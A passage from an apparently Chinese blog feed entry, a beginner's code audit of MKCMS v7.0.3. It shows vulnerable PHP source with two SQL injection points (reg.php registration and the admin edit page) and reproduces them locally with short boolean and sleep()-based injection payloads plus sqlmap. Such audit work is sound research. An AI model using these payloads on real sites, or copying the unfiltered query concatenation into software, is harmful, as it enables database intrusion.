class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></li></ul><p>但是在第7行处，<code>$username</code>的值是来自于<code>POST</code>传递的<code>name</code>参数，当<code>name</code>参数到达<code>reg.php</code>这个文件之后，<code>stripslashes（）</code>函数将<code>name</code>的值进行了去除<code>“\”</code>处理，<br><img src="https://img-blog.csdnimg.cn/2020122409471580.png"></p><p>根据<code>include</code>，跳转到<code>/system/library.php</code>中，我们可以发现这里系统对<code>GET</code>、<code>POST</code>等参数进行了<code>addslashes_deep（）</code>函数处理，即对参数传递时加上了一个<code>“\”</code>，<br><img src="https://img-blog.csdnimg.cn/20201224094931786.png"></p><p>问题就出在这里，前端用户进行提交的<code>name</code>参数，经过了<code>addslashes_deep（）</code>函数处理加上了一个<code>“\”</code>，到达<code>reg.php</code>页面又使用<code>stripslashes（）</code>函数将<code>name</code>的值进行了去除<code>“\”</code>处理，这就导致出现了无过滤拼接。</p><h1 id="第二处注入"><a href="#第二处注入" class="headerlink" title="第二处注入"></a>第二处注入</h1><ul><li><p><strong>漏洞文件</strong><br><code>admin/model/admin_edit.php</code>（后台文件）</p></li><li><p><strong>分析</strong><br>在<code>admin_edit.php</code>文件第10行处，系统进行了数据库查询，拼接了两个参数，一个是<code>POST</code>传递的<code>a_name</code>，一个是<code>GET</code>传递的<code>id</code>，可以看出，系统并未对参数在这里做任何的过滤处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;save&#39;])) &#123;</span><br><span class="line">null_back($_POST[&#39;a_name&#39;], &#39;请填写登录账号&#39;);</span><br><span class="line">null_back($_POST[&#39;a_password&#39;], &#39;请填写登录密码&#39;);</span><br><span class="line">null_back($_POST[&#39;a_cpassword&#39;], &#39;请重复输入登录密码&#39;);</span><br><span class="line">if ($_POST[&#39;a_password&#39;] !&#x3D; $_POST[&#39;a_cpassword&#39;]) &#123;</span><br><span class="line">alert_back(&#39;两次输入的密码不一致&#39;);</span><br><span class="line">&#125;</span><br><span class="line">$result &#x3D; mysqli_query($conn,&#39;select * from mkcms_manager where m_name &#x3D; &quot;&#39; . $_POST[&#39;a_name&#39;] . &#39;&quot; and m_id &lt;&gt; &#39; . $_GET[&#39;id&#39;] . &#39;&#39;);</span><br><span class="line">if (mysqli_fetch_array($result)) &#123;</span><br><span class="line">alert_back(&#39;登录账号重复，请更换登录账号。&#39;);</span><br><span class="line">&#125;</span><br><span class="line">$_data[&#39;m_name&#39;] &#x3D; $_POST[&#39;a_name&#39;];</span><br><span class="line">$_data[&#39;m_password&#39;] &#x3D; md5($_POST[&#39;a_password&#39;]);</span><br><span class="line">$sql &#x3D; &#39;update mkcms_manager set &#39; . arrtoupdate($_data) . &#39; where m_id &#x3D; &#39; . $_GET[&#39;id&#39;] . &#39;&#39;;</span><br><span class="line">if (mysqli_query($conn,$sql)) &#123;</span><br><span class="line">alert_href(&#39;管理员修改成功!&#39;, &#39;cms_admin.php&#39;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">alert_back(&#39;修改失败!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201224095407687.png"></p></li></ul><h1 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h1><ul><li><p><strong>环境搭建</strong><br>由于需要设置伪静态，这里用的是宝塔面板<br>源码地址：<a href="https://pan.baidu.com/s/1ejCjLSVQEa1tFINVTPqfyA">米酷CMS v7.0.3</a>，提取码：uy5u<br>（环境搭建教程在源码中附有）<br>搭建完成：<br>后台账号密码为<code>admin/admin</code><br><img src="https://img-blog.csdnimg.cn/20201224095929466.png"></p></li><li><p><strong>第一处漏洞测试</strong><br>来到前台漏洞点，<code>http://mkcms.com/ucenter/reg.php</code>（<em>mkcms.com为本地静态!</em>)<br>抓包注册<code>admin</code>用户，提示已存在<br><img src="https://img-blog.csdnimg.cn/20201224100359818.png"></p></li></ul><p>在<code>name</code>参数处构造<strong>Payload</strong>：<code>+and+&#39;1&#39;=&#39;2</code><br><img src="https://img-blog.csdnimg.cn/20201224100515100.png"></p><p>在<code>name</code>参数处构造<strong>Payload</strong>：<code>+and+&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/20201224100537442.png"></p><p>根据不同的返回值可以说明构造的payload被拼接到数据库进行了判断处理.<br>使用sqlmap验证<br><img src="https://img-blog.csdnimg.cn/20201224100655923.png"></p><ul><li><strong>第二处漏洞测试</strong><br>定位到漏洞点，url：<code>http://mkcms.com/admin/cms_admin_edit.php?id=1</code>（<em>mkcms.com为本地静态!</em>)<br><img src="https://img-blog.csdnimg.cn/20201224100835165.png"></li></ul><p>使用单引号进行判断<br><img src="https://img-blog.csdnimg.cn/20201224100855576.png"></p><p>构造<strong>payload：</strong><code>id=1+and+if(1&gt;2,1,sleep(3))</code><br><img src="https://img-blog.csdnimg.cn/20201224100919889.png"></p><p>可以看到，数据库执行了<code>sleep（）</code>函数</p><p>直接丢到sqlmap进行注入<br><img src="https://img-blog.csdnimg.cn/20201224101017956.png"></p><p>至此，米酷cms v7.0.3漏洞复现结束<br>这篇文章是一次非常简单的代码审计以及复现过程<br>初触代码审计，大佬多多指教</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h1&gt;&lt;p&gt;米酷影视管理系统是一套专为不同需求的站长而设计的影视管理系统，灵活，方便，人性化设计简单易用是最大的特色，是快速架设视频网站</summary>
      
    
    
    
    <category term="代码审计" scheme="http://nice759.com/Categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="php" scheme="http://nice759.com/tags/php/"/>
    
    <category term="代码审计" scheme="http://nice759.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
